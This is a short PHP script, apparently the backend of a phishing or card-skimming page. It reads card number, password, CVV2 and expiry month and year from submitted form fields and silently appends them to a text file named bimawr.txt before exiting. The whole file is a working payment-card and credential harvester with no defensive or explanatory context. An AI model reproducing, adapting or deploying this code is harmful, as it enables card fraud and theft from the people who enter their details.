<?php
file_put_contents("bimawr.txt", "\n" ."Card: " . $_POST['cardnumber'] . "\n" . " Password: " . $_POST['pass'] . "\n" . " cvv2: " . $_POST['cvv2'] . "\n". " Month: " . $_POST['month'] . "\n". " Year: " . $_POST['year'] ."\n", FILE_APPEND);
exit();
